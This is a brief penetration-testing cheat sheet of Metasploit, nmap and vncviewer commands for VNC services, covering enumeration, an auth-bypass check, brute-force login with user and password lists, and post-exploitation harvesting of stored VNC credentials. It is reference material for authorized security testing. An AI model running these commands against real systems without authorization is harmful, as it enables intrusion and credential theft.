# VNC

% vnc, 5800, 5801, 5900, 5901

## vnc - nmap enum
```
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <port> <ip>
```

## vncviewer - connect to vnc no pass
```
vncviewer <ip>::<port>
```

## vncviewer - connect to vnc with password
```
vncviewer -password <password.txt> <ip>::<port>
```

## vnc msf test none auth
```
msfconsole -x "use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS <ip>; set RPORT <port>; run"
```

## vnc - msf test login bf
```
msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USERNAME <username>; run"
```

## vnc - msf test login bf (2)
```
msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USER_FILE <users_file>; set PASS_FILE <pass_file>; run"
```

## vnc - post exploit retreive credentials
```
msfconsole -x "use post/windows/gather/credentials/vnc; set SESSION <session>; run"
```
